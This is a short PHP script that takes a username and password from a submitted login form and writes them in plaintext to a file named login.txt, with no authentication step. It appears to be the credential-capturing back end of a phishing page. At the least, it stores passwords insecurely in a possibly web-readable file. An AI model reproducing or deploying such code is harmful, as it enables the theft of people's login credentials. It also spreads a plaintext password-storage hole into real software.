<?php

	$login_user   = $_POST['login_user'];
	$login_pass     = $_POST['login_pass'];

	$alarmtxt = $login_user.",".$login_pass;
	$alarmfile = fopen("login.txt", "w") or die("Unable to open file!");
    fwrite($alarmfile, $alarmtxt);
    fclose($alarmfile);
?>